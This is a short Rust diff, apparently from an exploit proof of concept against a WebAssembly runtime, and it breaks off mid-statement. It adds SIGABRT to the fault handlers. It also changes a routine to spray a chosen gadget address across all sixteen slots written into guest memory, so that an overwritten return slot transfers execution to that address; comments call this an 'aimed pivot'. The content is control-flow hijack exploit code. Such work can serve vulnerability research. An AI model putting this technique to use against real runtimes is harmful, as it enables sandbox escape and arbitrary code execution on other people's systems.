@@ -208,6 +208,7 @@ fn install_ws_handlers() {
         libc::sigaction(libc::SIGBUS, &sa, core::ptr::null_mut());
         libc::sigaction(libc::SIGILL, &sa, core::ptr::null_mut());
         libc::sigaction(libc::SIGFPE, &sa, core::ptr::null_mut());
+        libc::sigaction(libc::SIGABRT, &sa, core::ptr::null_mut());
     }
 }
 
@@ -586,9 +587,18 @@ fn nested(
             Ok(mem) => {
                 let view = mem.view(&store_b);
                 let mut vals: Vec<u8> = Vec::with_capacity(16 * 8);
-                vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
-                for _ in 0..15 {
-                    vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
+                if marker == 0 {
+                    // all slots = the gadget address: any batch slot that lands on the return
+                    // slot transfers execution to the chosen address (e.g. a ud2 -> SIGILL
+                    // with fault_addr == the gadget, proving the aimed pivot).
+                    for _ in 0..16 {
+                        vals.extend_from_slice(&gadget_addr.to_le_bytes());
+                    }
+                } else {
+                    vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
+                    for _ in 0..15 {
+                        vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
+                    }
                 }
                 match view.write(64, &vals) {
                     Ok(_) => eprintln!(
